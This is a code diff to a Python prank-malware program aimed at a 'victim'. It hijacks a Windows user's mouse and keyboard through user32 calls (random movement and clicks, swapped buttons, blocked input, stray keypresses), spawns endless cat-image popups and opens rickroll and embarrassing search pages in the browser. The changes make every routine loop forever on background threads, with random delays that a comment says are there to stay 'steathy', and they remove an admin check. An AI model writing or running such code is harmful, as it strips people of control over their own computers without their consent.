@@ -7,9 +7,6 @@
 
 import os
 
-import PIL.Image
-import PIL.ImageTk
-
 def is_admin() -> bool:
     try:
         # only windows users with admin privileges can read the C:\windows\temp
@@ -302,7 +299,9 @@ def mouse_malfunction() -> Callable:
         new_sense = random.randint(1, 20)  # Random sensitivity between 1 and 20
         user32.SystemParametersInfoW(0x0071, 0, new_sense, 0)  # SPI_SETMOUSESPEED
 
-    return random.choice([move_mouse_randomly, random_clicks, random_wheel_scroll, double_click, swap_mouse_buttons])
+    while True:
+        random.choice([move_mouse_randomly, random_clicks, random_wheel_scroll, double_click, swap_mouse_buttons, cursor_trail, sensitivity])()
+        time.sleep(random.randint(30, 300))  # try stay steathy hopefully lol
 
 
 def keyboard_malfunction() -> Callable:
@@ -329,7 +328,9 @@ def keyboard_malfunction() -> Callable:
         user32.keybd_event(0x14, 0, 2, 0)
     
     
-    return random.choice([block_input, random_key_presses, broken_caps_lock])
+    while True:
+        random.choice([block_input, random_key_presses, broken_caps_lock])()
+        time.sleep(random.randint(30, 300))  # Up to 30s delay to try stay steathy hopefully lol
 
 
 # Feature 2 - Random popup windows, no idea how to do this yet...
@@ -339,34 +340,37 @@ def funny_windows():
     from urllib.request import urlopen, Request
     import tkinter as tk
     import PIL.ImageTk, PIL.ImageFile
-
+    
     url = 'https://cataas.com/cat?position=center&width=1000&height=1000&json=true'
     req = Request(url, headers={'User-Agent': 'Mozilla/5.0'})
-    response = json.loads(urlopen(req).read())
+    while True:
+        response = json.loads(urlopen(req).read())
 
-    window = tk.Tk()
-    window.resizable(False, False)
+        window = tk.Toplevel()
+        window.resizable(False, False)
 
-    image_content_url, mime_type= response['url'], response['mimetype'][6:]  # mimetype is like 'image/png'
-    image_data = urlopen(image_content_url).read()
-    parser = PIL.ImageFile.Parser()
-    parser.feed(image_data)
-    image = PIL.ImageTk.PhotoImage(parser.close(), format=mime_type)
+        image_content_url, mime_type= response['url'], response['mimetype'][6:]  # mimetype is like 'image/png'
+        image_data = urlopen(image_content_url).read()
+        parser = PIL.ImageFile.Parser()
+        parser.feed(image_data)
+        image = PIL.ImageTk.PhotoImage(parser.close(), format=mime_type)
 
-    canvas = tk.Canvas(window, width=image.width(), height=image.height())
-    canvas.pack()
-    canvas.create_image(0, 0, image=image, anchor='nw')
-    canvas.pack(padx=0, pady=0) # Make it fit
+        canvas = tk.Canvas(window, width=image.width(), height=image.height())
+        canvas.create_image(0, 0, image=image, anchor='nw')
+        canvas.pack(padx=0, pady=0) # Make it fit
 
-    window.title("Meow :3")
-    window.update()
-    
+        window.title("Meow :3")
+        window.update()
+
+        time.sleep(random.randint(60, 600))
+        if window.winfo_exists():
+            window.destroy()
 
 
 # Feature 3 - Random rickroll redirects, no idea how to do this yet...
 
 def redirects():
-    """Randomly redirects victim to funny places"""
+    """Randomly sends victim to funny places"""
     import webbrowser
     sites = [
         'https://www.youtube.com/watch?v=dQw4w9WgXcQ', # RIckroll
@@ -374,19 +378,18 @@ def redirects():
         'https://www.google.com/search?q=Do%20I%20have%20Syphilis',
         'https://www.youtube.com/watch?v=XqZsoesa55w' # Baby Shark
     ]
-    webbrowser.open(random.choice(sites))
+    while True:
+        webbrowser.open(random.choice(sites))
+        time.sleep(random.randint(60, 600))
 
 
 # Example usage for now
 def main():
-    if not is_admin():
-        os._exit(1)
-    i = 0
-    while i < 10:
-        i += 1
-        mouse_malfunction()()
-        keyboard_malfunction()()
-        time.sleep(1) 
+    threading.Thread(target=funny_windows).start()
+    threading.Thread(target=mouse_malfunction()).start()
+    threading.Thread(target=keyboard_malfunction()).start()
+    threading.Thread(target=redirects).start()
+    
 
 
 if __name__ == "__main__":
